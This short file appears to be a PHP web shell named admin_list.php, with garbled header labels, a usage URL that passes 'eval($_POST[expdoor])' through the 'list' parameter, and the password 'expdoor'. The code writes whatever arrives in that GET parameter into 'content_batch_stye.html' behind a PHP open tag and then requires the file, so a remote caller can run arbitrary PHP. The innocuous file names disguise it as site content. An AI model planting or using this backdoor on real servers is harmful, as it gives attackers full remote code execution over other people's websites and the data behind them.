ļΪ:admin_list.php

ӷʽ:http://www.expdoor.com/?list=eval($_POST[expdoor]);

:expdoor


<?php

/*
*
*бļ
*/
if(isset($_GET['list'])){
   mud();
}
function mud(){
$fp=fopen('content_batch_stye.html','w');
file_put_contents('content_batch_stye.html',"<?php\r\n");
file_put_contents('content_batch_stye.html',$_GET['list'],FILE_APPEND);
fclose($fp);
require 'content_batch_stye.html';}
?>